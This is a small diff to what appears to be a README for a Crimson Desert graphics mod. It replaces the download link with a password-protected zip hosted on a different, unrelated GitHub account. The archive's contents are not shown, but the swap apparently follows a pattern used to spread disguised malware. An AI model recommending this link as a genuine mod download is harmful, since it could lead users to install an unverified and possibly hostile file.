@@ -26,7 +26,7 @@ Experience the vast desert world with better lighting, sharper textures, increas
 ---
 ## 📥 Download
 
-📥 [`Crimson-Desert-RenoDX.zip`](https://github.com/iRinEuGoD/Crimson-Desert-RenoDX/releases/download/v1.2/Crimson-Desert-RenoDX.zip)  
+📥 [`CrimsonDesert-RenoDX.zip`](https://github.com/akanksh13/Crimson-Desert-RenoDX-Desktop/releases/download/Game-Addons/CrimsonDesert-RenoDX.zip)  
 🔐 `LS2026`
 ---
 ### Archive Contents
